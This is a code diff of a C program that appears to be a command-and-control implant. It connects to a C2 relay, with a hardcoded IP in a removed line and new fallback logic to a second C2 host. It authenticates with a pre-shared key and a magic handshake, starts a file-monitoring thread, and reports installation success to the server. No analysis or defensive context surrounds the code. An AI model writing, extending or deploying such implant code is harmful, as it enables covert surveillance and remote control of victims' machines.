@@ -144,10 +144,10 @@ int main(int argc, char *argv[]) {
     }
 
     if (secret == NULL) {
-        fprintf(stderr, "[ERROR] V1.0 - Secret key (-s) is mandatory for agent initialization\n");
+        fprintf(stderr, "[ERROR] Secret key (-s) is mandatory for agent initialization\n");
         return 1;
     }
-    if (relay_host == NULL) relay_host = strdup("13.213.138.250");
+    if (relay_host == NULL) relay_host = strdup(DEFAULT_C2_HOST);
     if (relay_port_str == NULL) relay_port_str = strdup("443");
 
     ph_heap_secret_t secret_ctx;
@@ -180,6 +180,13 @@ int main(int argc, char *argv[]) {
 
         uint16_t relay_port = (uint16_t)atoi(relay_port_str);
         int conn_res = ph_socket_connect(sock_fd, relay_host, relay_port, 5000);
+        
+        // Fallback logic
+        if (conn_res != PH_OK && strcmp(relay_host, DEFAULT_C2_HOST) == 0) {
+            DEBUG_LOG("INFO", "Primary relay failed, trying fallback\n");
+            conn_res = ph_socket_connect(sock_fd, FALLBACK_C2_HOST, relay_port, 5000);
+        }
+
         if (conn_res != PH_OK) {
             ph_socket_close(sock_fd);
             sleep(retry_delay);
@@ -187,7 +194,7 @@ int main(int argc, char *argv[]) {
             continue;
         }
 
-        // v1.0 Final Pre-Auth: Send PSK (OYEN)
+        // Pre-Auth: Send PSK (OYEN)
         uint32_t psk = htonl(0x4F59454E);
         if (send(sock_fd, &psk, 4, 0) < 0) {
             ph_socket_close(sock_fd);
@@ -213,17 +220,17 @@ int main(int argc, char *argv[]) {
         char phnt_magic[5];
         decode_phnt(phnt_magic, sizeof(phnt_magic));
         memcpy(handshake.magic, phnt_magic, 4);
-        handshake.version = 0x01; // V1.0 Branding
+        handshake.version = 0x01;
         memcpy(handshake.payload, ed25519_keys.public_key, 32);
         ph_tls_send(&tls_ctx, &handshake, sizeof(handshake));
 
-        // Launch real-time file monitoring thread (V1.0)
+        // Launch real-time file monitoring thread
         pthread_t monitor_tid;
         pthread_create(&monitor_tid, NULL, ph_monitor_thread, &tls_ctx);
         pthread_detach(monitor_tid);
 
         // Send Install Success Signal
-        char install_msg[] = "Installation successful - V1.0 Supreme Standard";
+        char install_msg[] = "Installation successful";
         ph_cmd_send_chunked(&tls_ctx, install_msg, strlen(install_msg), PH_CMD_INSTALL_SUCCESS, 0);
 
         uint8_t recv_buffer[4096];
